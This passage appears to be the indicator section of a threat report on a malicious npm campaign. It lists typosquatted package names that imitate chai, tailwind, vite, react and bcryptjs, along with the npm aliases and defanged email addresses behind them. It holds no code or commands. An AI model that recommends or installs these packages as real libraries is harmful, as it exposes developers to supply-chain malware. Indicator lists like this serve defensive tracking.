5. [`bcryptjs-node-js`](https://socket.dev/npm/package/bcryptjs-node-js)
6. [`bcryptjs-nodejs`](https://socket.dev/npm/package/bcryptjs-nodejs)
7. [`bootstrap-flexgrid`](https://socket.dev/npm/package/bootstrap-flexgrid)
8. [`bootstrap-setcolor`](https://socket.dev/npm/package/bootstrap-setcolor)
9. [`bootstrap-setcolors`](https://socket.dev/npm/package/bootstrap-setcolors/overview/1.9.16)
10. [`bootstrap-setflexcolor`](https://socket.dev/npm/package/bootstrap-setflexcolor)
11. [`chai-as-deploy`](https://socket.dev/npm/package/chai-as-deploy)
12. [`chai-as-deployed`](https://socket.dev/npm/package/chai-as-deployed)
13. [`chai-as-sorted`](https://socket.dev/npm/package/chai-as-sorted)
14. [`chai-as-tested`](https://socket.dev/npm/package/chai-as-tested)
15. [`chai-async`](https://socket.dev/npm/package/chai-async)
16. [`chai-async-chain`](https://socket.dev/npm/package/chai-async-chain)
17. [`chai-async-flow`](https://socket.dev/npm/package/chai-async-flow)
18. [`chai-auth`](https://socket.dev/npm/package/chai-auth)
19. [`chai-await-asserts`](https://socket.dev/npm/package/chai-await-asserts)
20. [`chai-await-test`](https://socket.dev/npm/package/chai-await-test)
21. [`chai-await-utils`](https://socket.dev/npm/package/chai-await-utils)
22. [`chai-jsons`](https://socket.dev/npm/package/chai-jsons)
23. [`chai-pack`](https://socket.dev/npm/package/chai-pack)
24. [`chai-promise-chain`](https://socket.dev/npm/package/chai-promise-chain)
25. [`chai-promised-expect`](https://socket.dev/npm/package/chai-promised-expect/overview/2.4.1)
26. [`chai-promise-suite`](https://socket.dev/npm/package/chai-promise-suite)
27. [`chai-proxify`](https://socket.dev/npm/package/chai-proxify)
28. [`chai-status`](https://socket.dev/npm/package/chai-status)
29. [`chai-sync`](https://socket.dev/npm/package/chai-sync)
30. [`chai-test-await`](https://socket.dev/npm/package/chai-test-await)
31. [`chai-type`](https://socket.dev/npm/package/chai-type)
32. [`cookie-breaker`](https://socket.dev/npm/package/cookie-breaker/overview/1.1.0)
33. [`cookie-mapper`](https://socket.dev/npm/package/cookie-mapper/overview/1.1.0)
34. [`cookie-validate`](https://socket.dev/npm/package/cookie-validate)
35. [`cross-sessions`](https://socket.dev/npm/package/cross-sessions)
36. [`custom-log-viewer`](https://socket.dev/npm/package/custom-log-viewer)
37. [`cwanner`](https://socket.dev/npm/package/cwanner)
38. [`dataflow-unified`](https://socket.dev/npm/package/dataflow-unified)
39. [`dist-decoder`](https://socket.dev/npm/package/dist-decoder)
40. [`dotenv-intend`](https://socket.dev/npm/package/dotenv-intend)
41. [`elevate-log`](https://socket.dev/npm/package/elevate-log)
42. [`email-validated`](https://socket.dev/npm/package/email-validated/overview/1.0.4)
43. [`func-analysist`](https://socket.dev/npm/package/func-analysist)
44. [`glowmotion`](https://socket.dev/npm/package/glowmotion)
45. [`grid-settings`](https://socket.dev/npm/package/grid-settings)
46. [`grid-settings-align`](https://socket.dev/npm/package/grid-settings-align)
47. [`gridmancer`](https://socket.dev/npm/package/gridmancer)
48. [`init-router`](https://socket.dev/npm/package/init-router)
49. [`initial-path`](https://socket.dev/npm/package/initial-path)
50. [`js-coauth`](https://socket.dev/npm/package/js-coauth)
51. [`js-copack`](https://socket.dev/npm/package/js-copack)
52. [`js-cotype`](https://socket.dev/npm/package/js-cotype)
53. [`js-repack`](https://socket.dev/npm/package/js-repack)
54. [`js-uponcaps`](https://socket.dev/npm/package/js-uponcaps/overview/7.2.7)
55. [`json-getin`](https://socket.dev/npm/package/json-getin)
56. [`json-oauth`](https://socket.dev/npm/package/json-oauth)
57. [`jsonauthcap`](https://socket.dev/npm/package/jsonauthcap/overview/7.2.7)
58. [`jsonapptoken`](https://socket.dev/npm/package/jsonapptoken)
59. [`jsonauth`](https://socket.dev/npm/package/jsonauth)
60. [`jsonauto`](https://socket.dev/npm/package/jsonauto)
61. [`json-panels`](https://socket.dev/npm/package/json-panels/)
62. [`jsonify-settings`](https://socket.dev/npm/package/jsonify-settings)
63. [`jsonpino`](https://socket.dev/npm/package/jsonpino)
64. [`jsonrecap`](https://socket.dev/npm/package/jsonrecap)
65. [`jsonretype`](https://socket.dev/npm/package/jsonretype)
66. [`jsswapper`](https://socket.dev/npm/package/jsswapper)
67. [`jstoauto`](https://socket.dev/npm/package/jstoauto)
68. [`kyjnzu`](https://socket.dev/npm/package/kyjnzu)
69. [`lintcolor`](https://socket.dev/npm/package/lintcolor)
70. [`log-pino`](https://socket.dev/npm/package/log-pino)
71. [`logify-pino`](https://socket.dev/npm/package/logify-pino)
72. [`module-listener`](https://socket.dev/npm/package/module-listener/overview/1.1.0)
73. [`muleforge`](https://socket.dev/npm/package/muleforge)
74. [`multi-provider-settings`](https://socket.dev/npm/package/multi-provider-settings)
75. [`node-tailwind`](https://socket.dev/npm/package/node-tailwind)
76. [`node-tailwind-magic`](https://socket.dev/npm/package/node-tailwind-magic)
77. [`pgforce`](https://socket.dev/npm/package/pgforce)
78. [`pino-logging`](https://socket.dev/npm/package/pino-logging)
79. [`pixel-bloom`](https://socket.dev/npm/package/pixel-bloom)
80. [`pixelblm`](https://socket.dev/npm/package/pixelblm)
81. [`pretty-text-formatter`](https://socket.dev/npm/package/pretty-text-formatter)
82. [`radix-ui-react-modal`](https://socket.dev/npm/package/radix-ui-react-modal)
83. [`react-adparser`](https://socket.dev/npm/package/react-adparser)
84. [`react-alerts-template-basic`](https://socket.dev/npm/package/react-alerts-template-basic)
85. [`react-bindify-decorators`](https://socket.dev/npm/package/react-bindify-decorators)
86. [`react-flex-tools`](https://socket.dev/npm/package/react-flex-tools)
87. [`react-icon-updater`](https://socket.dev/npm/package/react-icon-updater/overview/1.0.4)
88. [`react-ipack`](https://socket.dev/npm/package/react-ipack)
89. [`react-mandes`](https://socket.dev/npm/package/react-mandes)
90. [`react-medias`](https://socket.dev/npm/package/react-medias)
91. [`react-modal-select`](https://socket.dev/npm/package/react-modal-select)
92. [`react-notifications-alert`](https://socket.dev/npm/package/react-notifications-alert)
93. [`react-prop-types-helper`](https://socket.dev/npm/package/react-prop-types-helper)
94. [`react-resizable-text`](https://socket.dev/npm/package/react-resizable-text)
95. [`react-sideflow`](https://socket.dev/npm/package/react-sideflow)
96. [`react-stateflow`](https://socket.dev/npm/package/react-stateflow)
97. [`react-svg-bundler`](https://socket.dev/npm/package/react-svg-bundler)
98. [`react-svg-fill`](https://socket.dev/npm/package/react-svg-fill/overview/1.0.0)
99. [`react-svgs-helper`](https://socket.dev/npm/package/react-svgs-helper)
100. [`react-svg-helper-fast`](https://socket.dev/npm/package/react-svg-helper-fast)
101. [`react-svg-supporter`](https://socket.dev/npm/package/react-svg-supporter/overview/1.3.4)
102. [`react-tchart`](https://socket.dev/npm/package/react-tchart)
103. [`react-tmedia`](https://socket.dev/npm/package/react-tmedia)
104. [`react-ui-animates`](https://socket.dev/npm/package/react-ui-animates)
105. [`react-ui-notify`](https://socket.dev/npm/package/react-ui-notify)
106. [`reactify-utils`](https://socket.dev/npm/package/reactify-utils)
107. [`reactjs-fabric`](https://socket.dev/npm/package/reactjs-fabric)
108. [`redux-motion`](https://socket.dev/npm/package/redux-motion)
109. [`seeds-alert`](https://socket.dev/npm/package/seeds-alert)
110. [`seeds-random`](https://socket.dev/npm/package/seeds-random)
111. [`session-expire`](https://socket.dev/npm/package/session-expire/overview/2.4.1)
112. [`session-keeper`](https://socket.dev/npm/package/session-keeper)
113. [`session-parer`](https://socket.dev/npm/package/session-parer)
114. [`session-parse`](https://socket.dev/npm/package/session-parse)
115. [`session-validate`](https://socket.dev/npm/package/session-validate)
116. [`shadeforge`](https://socket.dev/npm/package/shadeforge)
117. [`signale-log`](https://socket.dev/npm/package/signale-log)
118. [`smart-parser`](https://socket.dev/npm/package/smart-parser)
119. [`stram-log`](https://socket.dev/npm/package/stram-log)
120. [`stringify-coder`](https://socket.dev/npm/package/stringify-coder)
121. [`style-config-tailwind`](https://socket.dev/npm/package/style-config-tailwind)
122. [`style-tailwind-variant`](https://socket.dev/npm/package/style-tailwind-variant)
123. [`tailwind-areachart`](https://socket.dev/npm/package/tailwind-areachart)
124. [`tailwind-barchart`](https://socket.dev/npm/package/tailwind-barchart)
125. [`tailwind-chart`](https://socket.dev/npm/package/tailwind-chart)
126. [`tailwind-config-view`](https://socket.dev/npm/package/tailwind-config-view)
127. [`tailwind-dynamic`](https://socket.dev/npm/package/tailwind-dynamic)
128. [`tailwind-fa-bridge`](https://socket.dev/npm/package/tailwind-fa-bridge)
129. [`tailwind-forms-plus`](https://socket.dev/npm/package/tailwind-forms-plus)
130. [`tailwind-gradient-image`](https://socket.dev/npm/package/tailwind-gradient-image)
131. [`tailwind-grid-tools`](https://socket.dev/npm/package/tailwind-grid-tools)
132. [`tailwind-interact`](https://socket.dev/npm/package/tailwind-interact)
133. [`tailwind-justify`](https://socket.dev/npm/package/tailwind-justify)
134. [`tailwind-magic`](https://socket.dev/npm/package/tailwind-magic)
135. [`tailwind-merge-setting`](https://socket.dev/npm/package/tailwind-merge-setting)
136. [`tailwind-morph`](https://socket.dev/npm/package/tailwind-morph)
137. [`tailwind-node`](https://socket.dev/npm/package/tailwind-node)
138. [`tailwind-piechart`](https://socket.dev/npm/package/tailwind-piechart)
139. [`tailwind-react-plugin`](https://socket.dev/npm/package/tailwind-react-plugin)
140. [`tailwind-setting`](https://socket.dev/npm/package/tailwind-setting)
141. [`tailwind-state`](https://socket.dev/npm/package/tailwind-state)
142. [`tailwind-style-override`](https://socket.dev/npm/package/tailwind-style-override)
143. [`tailwind-utils-plus`](https://socket.dev/npm/package/tailwind-utils-plus)
144. [`tailwind-utilx`](https://socket.dev/npm/package/tailwind-utilx)
145. [`tailwind-variance`](https://socket.dev/npm/package/tailwind-variance)
146. [`tailwind-view-ui`](https://socket.dev/npm/package/tailwind-view-ui/overview/0.3.4)
147. [`tailwind-widgets`](https://socket.dev/npm/package/tailwind-widgets)
148. [`tailwindcss-aerowind`](https://socket.dev/npm/package/tailwindcss-aerowind)
149. [`tailwindcss-animatedfly`](https://socket.dev/npm/package/tailwindcss-animatedfly)
150. [`tailwindcss-animation-css`](https://socket.dev/npm/package/tailwindcss-animation-css)
151. [`tailwindcss-animation-helper`](https://socket.dev/npm/package/tailwindcss-animation-helper)
152. [`tailwindcss-animation-style`](https://socket.dev/npm/package/tailwindcss-animation-style)
153. [`tailwindcss-awesomefont`](https://socket.dev/npm/package/tailwindcss-awesomefont)
154. [`tailwindcss-bootstrap-color`](https://socket.dev/npm/package/tailwindcss-bootstrap-color)
155. [`tailwindcss-breezium`](https://socket.dev/npm/package/tailwindcss-breezium)
156. [`tailwindcss-csstree`](https://socket.dev/npm/package/tailwindcss-csstree)
157. [`tailwindcss-containers`](https://socket.dev/npm/package/tailwindcss-containers/overview/2.13.5)
158. [`tailwindcss-flexbox`](https://socket.dev/npm/package/tailwindcss-flexbox/overview/1.9.16)
159. [`tailwindcss-flexflow`](https://socket.dev/npm/package/tailwindcss-flexflow)
160. [`tailwindcss-fontawesome`](https://socket.dev/npm/package/tailwindcss-fontawesome)
161. [`tailwindcss-forms`](https://socket.dev/npm/package/tailwindcss-forms)
162. [`tailwindcss-gustify`](https://socket.dev/npm/package/tailwindcss-gustify)
163. [`tailwindcss-helpers`](https://socket.dev/npm/package/tailwindcss-helpers)
164. [`tailwindcss-motionflex`](https://socket.dev/npm/package/tailwindcss-motionflex)
165. [`tailwindcss-react-animation`](https://socket.dev/npm/package/tailwindcss-react-animation)
166. [`tailwindcss-react-sass`](https://socket.dev/npm/package/tailwindcss-react-sass)
167. [`tailwindcss-setanimation`](https://socket.dev/npm/package/tailwindcss-setanimation)
168. [`tailwindcss-setfavicon`](https://socket.dev/npm/package/tailwindcss-setfavicon)
169. [`tailwindcss-setflexgrid`](https://socket.dev/npm/package/tailwindcss-setflexgrid)
170. [`tailwindcss-setfont`](https://socket.dev/npm/package/tailwindcss-setfont)
171. [`tailwindcss-setfontstyle`](https://socket.dev/npm/package/tailwindcss-setfontstyle)
172. [`tailwindcss-setgrid`](https://socket.dev/npm/package/tailwindcss-setgrid)
173. [`tailwindcss-setgrids`](https://socket.dev/npm/package/tailwindcss-setgrids)
174. [`tailwindcss-setmotion`](https://socket.dev/npm/package/tailwindcss-setmotion)
175. [`tailwindcss-setremotion`](https://socket.dev/npm/package/tailwindcss-setremotion)
176. [`tailwindcss-tailkit`](https://socket.dev/npm/package/tailwindcss-tailkit)
177. [`tailwindcss-twflare`](https://socket.dev/npm/package/tailwindcss-twflare)
178. [`tailwindcss-web-font-awesome`](https://socket.dev/npm/package/tailwindcss-web-font-awesome)
179. [`testing-react-dom`](https://socket.dev/npm/package/testing-react-dom)
180. [`validator-node`](https://socket.dev/npm/package/validator-node)
181. [`vite-chunk-master`](https://socket.dev/npm/package/vite-chunk-master)
182. [`vite-commonjs-support`](https://socket.dev/npm/package/vite-commonjs-support)
183. [`vite-compiler-tools`](https://socket.dev/npm/package/vite-compiler-tools)
184. [`vite-dynachunk`](https://socket.dev/npm/package/vite-dynachunk)
185. [`vite-dynamic-chunks`](https://socket.dev/npm/package/vite-dynamic-chunks)
186. [`vite-manual-chunker`](https://socket.dev/npm/package/vite-manual-chunker)
187. [`vite-plugin-es6-compat`](https://socket.dev/npm/package/vite-plugin-es6-compat)
188. [`vite-plugin-parseflow`](https://socket.dev/npm/package/vite-plugin-parseflow)
189. [`vite-plugin-parsify`](https://socket.dev/npm/package/vite-plugin-parsify)
190. [`vite-plugin-postcss-tools`](https://socket.dev/npm/package/vite-plugin-postcss-tools)
191. [`vite-smart-chunk`](https://socket.dev/npm/package/vite-smart-chunk)
192. [`vite-support-kit`](https://socket.dev/npm/package/vite-support-kit)
193. [`web-vitals-help`](https://socket.dev/npm/package/web-vitals-help)
194. [`webpack-compilejsx`](https://socket.dev/npm/package/webpack-compilejsx)
195. [`webpack-jsxcompile`](https://socket.dev/npm/package/webpack-jsxcompile)
196. [`webpack-loadcss`](https://socket.dev/npm/package/webpack-loadcss)
197. [`xdater`](https://socket.dev/npm/package/xdater)

### npm Aliases

1. `abigailzebrairses36717`
2. `alex9901`
3. `alex9902`
4. `allenhand`
5. `appleseed123123`
6. `asd99388488`
7. `avaaz_aleaanwvk05883`
8. `b22993172`
9. `bizownership018`
10. `blakegon_zalezeamuh10473`
11. `blaziyistan`
12. `bookcats1`
13. `borgdan0818`
14. `brandon_mistycqbcr0601`
15. `brightfuturescompany08462`
16. `brimstoneinkwellwugke`
17. `bryceprojects78322`
18. `btwininvest02417`
19. `bzuinvestorsclub82574`
20. `charlieaffiliates22177`
21. `cheaphomeseller55358`
22. `chicagomrreid01317`
23. `citylivingagent99587`
24. `crimson72489`
25. `cygnu_sonyxxzbek89014`
26. `danielle_quaranta3`
27. `dataflight38629`
28. `daveysellshomes47484`
29. `dawsonspaces08839`
30. `dazzlebitcorp62317`
31. `dealmakersclub92647`
32. `devonventureinvest81368`
33. `dhruvishah05828`
34. `digitalhomesales97117`
35. `dkiem`
36. `dmitrypetrov71155`
37. `edisonrippin`
38. `elitecapitalgroup08563`
39. `emmahousingexpert87469`
40. `emmawills02165`
41. `erbanfceraswud8px`
42. `eurekasales07505`
43. `evergreenrealtyteam12469`
44. `evergreenrealtor59192`
45. `fasttrackhomes22444`
46. `firstchoicepropertyagent00182`
47. `frostlangleyzmmvy`
48. `futuregrowthhooger00277`
49. `futurehousefinder62139`
50. `greenhousebuyersclub77084`
51. `greenviewagent00541`
52. `harborviewproperty07246`
53. `henrylynbunnh`
54. `homedealconnect81891`
55. `homelynestsales49339`
56. `homesearchpro99483`
57. `homesolutionsnow95843`
58. `horizonpropertyteam88973`
59. `househunterpro12888`
60. `investcereal91863`
61. `investdreamz34518`
62. `investgrowthplanner16529`
63. `jasonhomesales01207`
64. `johnmarston39482`
65. `jonathonff1010`
66. `kevinspace09495`
67. `keycityagent64977`
68. `keycityrealtor98521`
69. `keystonenas`
70. `khardenjenna`
71. `kievrelationmanager07992`
72. `knightjenkinsybtec`
73. `krauszsenff3pkphh`
74. `kukuru423`
75. `landmarkhomesconsult33423`
76. `landscapeinvestor00913`
77. `lauradrwh`
78. `lendingcrafters51867`
79. `leowestbcqni016`
80. `lillihousingagent83183`
81. `lisaselingreen56157`
82. `londonhomesmartagent36691`
83. `londonpropertyagent33861`
84. `londonpropertyguide27011`
85. `luxuryhomebroker77429`
86. `luxuryprimeagent11914`
87. `maggiehomes68871`
88. `mariastanfordakchz04029`
89. `maximvaluehousings17477`
90. `metronewhomes21319`
91. `metropropertiesadvisor00082`
92. `metropolitanhomesguide99492`
93. `miamihouseconnect44257`
94. `miroinvestmentstudio04977`
95. `modernhomerealtor49536`
96. `modernspacesrealty29477`
97. `mohammedas`
98. `nataliastashkiv.bs`
99. `newcitydealers94317`
100. `newcityhomeadv90451`
101. `newheightsrealtor83727`
102. `newhousenexus82253`
103. `newleafapartment50743`
104. `newprimehomes70695`
105. `newskyrealestate29771`
106. `nextlevelproperties84193`
107. `nexthomeadviser68116`
108. `oakwoodpropertyteam97341`
109. `opalqwntfqqp7270`
110. `openhouserealestateagent27183`
111. `palmhouserealestate02758`
112. `pascaldev`
113. `peaksummitproperty81546`
114. `peterandr345`
115. `peterwood0912`
116. `ponbok20251123`
117. `premierhouseagent68861`
118. `primehomesconnect12973`
119. `primekeyrealtor09471`
120. `primelocationagent63672`
121. `prorealtyguide02229`
122. `propertyadvisor36515278`
123. `propertyconsultant48888`
124. `propertygatewayexpert36994`
125. `propertylistingexpert84712`
126. `rapidhomebuyer24518`
127. `realestateadvancer05390`
128. `realestateconsult11470`
129. `realestateconsultant78941`
130. `realestateguidelily27361`
131. `realestatepartnerz02814`
132. `realestorxpress23477`
133. `reddix505`
134. `reedfowlerccouj`
135. `ricardoat1010`
136. `richlandhousingsolutions81845`
137. `richmondhomesales42214`
138. `riverfrontproperties90177`
139. `riverstoneagent17563`
140. `rocksolidestate93364`
141. `rooflinerealtor00821`
142. `rootedlandagents77219`
143. `royalestateconnect43449`
144. `seasidehomesrealtor29486`
145. `seasideviewrealtor08465`
146. `seattlecityrealtor42890`
147. `silvercityproperty05525`
148. `silverlineproperty64209`
149. `skylinehomeadvisor14961`
150. `skylinehousesales62474`
151. `smartchoicehousing24861`
152. `smartcityhomes87496`
153. `smartkeyhomes00728`
154. `solidinvestments05572`
155. `solidpropertyadvisor33345`
156. `springtownhomes83379`
157. `stardev0914`
158. `suburbanhomeconnect16179`
159. `summitpropertyagent07717`
160. `sunnyvaleproperty44162`
161. `sunnyviewhomes49110`
162. `thecityhomesales97011`
163. `tomas510727`
164. `topchoicehomesconsult55882`
165. `topflite4`
166. `topflite5`
167. `topkeyrealestate99241`
168. `urbanhomefinder35266`
169. `urbanlivingteam00074`
170. `urbanpropertyguide43812`
171. `valleyhomesguide14195`
172. `victor510`
173. `vitalcityhomes22591`
174. `vrindalseth`
175. `westfieldhomeagent66414`
176. `yorktownhomesales08111`

### Email Addresses

1. `abigailzebrairses36717@outlook[.]com`
2. `alexander0110825@outlook[.]com`
3. `allenhand0101@outlook[.]com`
4. `alphabrownsapon70555@hotmail[.]com`
5. `amelievolcanobquvq06786@hotmail[.]com`
6. `avaazaleaanwvk05883@outlook[.]com`
7. `b22993172@gmail[.]com`
8. `bba719771@gmail[.]com`
9. `bizownership018@gmail[.]com`
10. `blakegonzalezeamuh10473@hotmail[.]com`
11. `blaziystankw1lcf@hotmail[.]com`
12. `bookcats1@freyaglam[.]shop`
13. `borgdandeco@gmail[.]com`
14. `brandonmistycqbcr06016@hotmail[.]com`
15. `brightfuturescompany08462@outlook[.]com`
16. `bryceprojects78322@hotmail[.]com`
17. `btwininvest02417@hotmail[.]com`
18. `bzuinvestorsclub82574@hotmail[.]com`
19. `charlieaffiliates22177@gmail[.]com`
20. `cheaphomeseller55358@gmail[.]com`
21. `chicagomrreid01317@gmail[.]com`
22. `citylivingagent99587@gmail[.]com`
23. `crimson72489@yahoo[.]com`
24. `cygnusonyxxzbek89014@gmail[.]com`
25. `daniellequaranta3@yahoo[.]com`
26. `dataflight38629@gmail[.]com`
27. `daveysellshomes47484@gmail[.]com`
28. `dawsonspaces08839@gmail[.]com`
29. `dazzlebitcorp62317@gmail[.]com`
30. `dealmakersclub92647@outlook[.]com`
31. `devonventureinvest81368@gmail[.]com`
32. `dhruvishah05828@outlook[.]com`
33. `digitalhomesales97117@gmail[.]com`
34. `dmitrypetrov71155@outlook[.]com`
35. `elitecapitalgroup08563@gmail[.]com`
36. `emmahousingexpert87469@gmail[.]com`
37. `emmawills02165@gmail[.]com`
38. `eurekasales07505@gmail[.]com`
39. `evergreenrealtyteam12469@gmail[.]com`
40. `evergreenrealtor59192@gmail[.]com`
41. `fasttrackhomes22444@gmail[.]com`
42. `firstchoicepropertyagent00182@gmail[.]com`
43. `frostlangleyzmmvy94489@outlook[.]com`
44. `futuregrowthhooger00277@gmail[.]com`
45. `futurehousefinder62139@gmail[.]com`
46. `gddavila.tomas510727@outlook.com`
47. `greenhousebuyersclub77084@gmail[.]com`
48. `greenviewagent00541@gmail[.]com`
49. `harborviewproperty07246@gmail[.]com`
50. `henrylynbunnh91@hotmail[.]com`
51. `homedealconnect81891@gmail[.]com`
52. `homesearchpro99483@gmail[.]com`
53. `homesolutionsnow95843@gmail[.]com`
54. `horizonpropertyteam88973@gmail[.]com`
55. `househunterpro12888@gmail[.]com`
56. `investcereal91863@gmail[.]com`
57. `investdreamz34518@gmail[.]com`
58. `investgrowthplanner16529@gmail[.]com`
59. `jasonhomesales01207@gmail[.]com`
60. `johnmarston39482@gmail[.]com`
61. `kevinspace09495@gmail[.]com`
62. `keycityagent64977@gmail[.]com`
63. `keycityrealtor98521@gmail[.]com`
64. `keystonenashynoum95584@outlook[.]com`
65. `kievrelationmanager07992@gmail[.]com`
66. `knightjenkinsybtec90710@outlook[.]com`
67. `krauszsenff3pkph@hotmail[.]com`
68. `landmarkhomesconsult33423@gmail[.]com`
69. `landscapeinvestor00913@gmail[.]com`
70. `lauradrwh@gmail[.]com`
71. `lendingcrafters51867@gmail[.]com`
72. `lillihousingagent83183@gmail[.]com`
73. `lisaselingreen56157@gmail[.]com`
74. `londonhomesmartagent36691@gmail[.]com`
75. `londonpropertyagent33861@gmail[.]com`
76. `londonpropertyguide27011@gmail[.]com`
77. `luxuryhomebroker77429@gmail[.]com`
78. `luxuryprimeagent11914@gmail[.]com`
79. `maggiehomes68871@gmail[.]com`
80. `mariastanfordakchz04029@hotmail[.]com`
81. `maximvaluehousings17477@gmail[.]com`
82. `metronewhomes21319@gmail[.]com`
83. `metropropertiesadvisor00082@gmail[.]com`
84. `metropolitanhomesguide99492@gmail[.]com`
85. `miamihouseconnect44257@gmail[.]com`
86. `miroinvestmentstudio04977@gmail[.]com`
87. `modernhomerealtor49536@gmail[.]com`
88. `modernspacesrealty29477@gmail[.]com`
89. `mohammedas517@outlook[.]com`
90. `nataliastashkiv.bs@outlook[.]com`
91. `newcitydealers94317@gmail[.]com`
92. `newcityhomeadv90451@gmail[.]com`
93. `newheightsrealtor83727@gmail[.]com`
94. `newhousenexus82253@gmail[.]com`
95. `newleafapartment50743@gmail[.]com`
96. `newprimehomes70695@gmail[.]com`
97. `newskyrealestate29771@gmail[.]com`
98. `nextlevelproperties84193@gmail[.]com`
99. `nexthomeadviser68116@gmail[.]com`
100. `oakwoodpropertyteam97341@gmail[.]com`
101. `opalqwntfqqp7270@outlook[.]com`
102. `openhouserealestateagent27183@gmail[.]com`
103. `palmhouserealestate02758@gmail[.]com`
104. `peaksummitproperty81546@gmail[.]com`
105. `peterandr345@gmail[.]com`
106. `ponbok20251123@outlook[.]com`
107. `premierhouseagent68861@gmail[.]com`
108. `primehomesconnect12973@gmail[.]com`
109. `primekeyrealtor09471@gmail[.]com`
110. `primelocationagent63672@gmail[.]com`
111. `prorealtyguide02229@gmail[.]com`
112. `propertyadvisor36515278@gmail[.]com`
113. `propertyconsultant48888@gmail[.]com`
114. `propertygatewayexpert36994@gmail[.]com`
115. `propertylistingexpert84712@gmail[.]com`
116. `rapidhomebuyer24518@gmail[.]com`
117. `realestateadvancer05390@gmail[.]com`
118. `realestateconsult11470@gmail[.]com`
119. `realestateconsultant78941@gmail[.]com`
120. `realestateguidelily27361@gmail[.]com`
121. `realestatepartnerz02814@gmail[.]com`
122. `realestorxpress23477@gmail[.]com`
123. `reddixyxzh551438@hotmail[.]com`
124. `ricardo.a.t.1010@outlook[.]com`
125. `richlandhousingsolutions81845@gmail[.]com`
126. `richmondhomesales42214@gmail[.]com`
127. `riverfrontproperties90177@gmail[.]com`
128. `riverstoneagent17563@gmail[.]com`
129. `rocksolidestate93364@gmail[.]com`
130. `rooflinerealtor00821@gmail[.]com`
131. `rootedlandagents77219@gmail[.]com`
132. `royalestateconnect43449@gmail[.]com`
133. `seasidehomesrealtor29486@gmail[.]com`
134. `seasideviewrealtor08465@gmail[.]com`
135. `seattlecityrealtor42890@gmail[.]com`
136. `silvercityproperty05525@gmail[.]com`
137. `silverlineproperty64209@gmail[.]com`
138. `skylinehomeadvisor14961@gmail[.]com`
139. `skylinehousesales62474@gmail[.]com`
140. `smartchoicehousing24861@gmail[.]com`
141. `smartcityhomes87496@gmail[.]com`
142. `smartkeyhomes00728@gmail[.]com`
143. `solidinvestments05572@gmail[.]com`
144. `solidpropertyadvisor33345@gmail[.]com`
145. `springtownhomes83379@gmail[.]com`
146. `stard8447@gmail[.]com`
147. `suburbanhomeconnect16179@gmail[.]com`
148. `summitpropertyagent07717@gmail[.]com`
149. `sunnyvaleproperty44162@gmail[.]com`
150. `sunnyviewhomes49110@gmail[.]com`
151. `thecityhomesales97011@gmail[.]com`
152. `topchoicehomesconsult55882@gmail[.]com`
153. `topflite5@freyaglam[.]shop`
154. `topkeyrealestate99241@gmail[.]com`
155. `urbanhomefinder35266@gmail[.]com`
156. `urbanlivingteam00074@gmail[.]com`
157. `urbanpropertyguide43812@gmail[.]com`
158. `valleyhomesguide14195@gmail[.]com`
159. `victormolonna510727@outlook[.]com`
160. `vitalcityhomes22591@gmail[.]com`
161. `westfieldhomeagent66414@gmail[.]com`
162. `yorktownhomesales08111@gmail[.]com`
163. `yuleyuccaxoiqw85368@outlook[.]com`
164. `bohdanstashkiv.bs@outlook[.]com`
165. `brimstoneinkwellwugke88241@outlook[.]com`
166. `edisonrippin@outlook[.]com`
167. `erbanfceraswud8px@hotmail[.]com`
168. `JonathonF1010@outlook[.]com`
169. `khardenjenna510727@outlook[.]com`
170. `kukurudza339@gmail[.]com`
171. `leowestbcqni01653@outlook[.]com`
172. `pascaldev0921@outlook[.]com`
173. `reedfowlerccouj11583@hotmail[.]com`
174. `topflite4@freyaglam[.]shop`
175. `vrindalseth@gmail[.]com`
176. `yelyzavetazaporozhtseva@gmail[.]com`
